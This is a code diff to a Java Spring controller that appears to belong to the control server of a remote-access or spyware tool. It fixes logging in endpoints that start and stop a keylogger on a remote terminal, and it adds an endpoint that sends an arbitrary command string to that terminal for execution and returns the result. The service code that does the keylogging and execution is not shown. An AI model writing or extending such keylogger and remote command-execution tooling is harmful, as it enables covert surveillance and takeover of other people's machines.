@@ -70,14 +70,23 @@ public class Controller {
     @RequestMapping("/startKeyLogger")
     public String startKeyLogger(@RequestParam(value = "terminalid", defaultValue = "127.0.0.1") String terminalid
     ) {
-        System.out.println("run terminal:" + terminalid + ":getos");
+        System.out.println("run terminal:" + terminalid + ":startKeyLogger");
         return controlService.startKeyLogger(terminalid);
     }
 
     @RequestMapping("/overKeyLogger")
     public String overKeyLogger(@RequestParam(value = "terminalid", defaultValue = "127.0.0.1") String terminalid
     ) {
-        System.out.println("run terminal:" + terminalid + ":getos");
-        return controlService.overKeyLogger(terminalid);
+        System.out.println("run terminal:" + terminalid + ":overKeyLogger");
+        return "" + controlService.overKeyLogger(terminalid);
+    }
+
+    @RequestMapping("/execCmdCommand")
+    public String execCmdCommand(@RequestParam(value = "terminalid", defaultValue = "127.0.0.1") String terminalid,
+                                 @RequestParam(value = "msg", defaultValue = "127.0.0.1") String msg
+    ) {
+        System.out.println("run terminal:" + terminalid + ":execCmdCommand");
+        System.out.println(msg);
+        return "" + controlService.execCmdCommand(terminalid, msg);
     }
 }
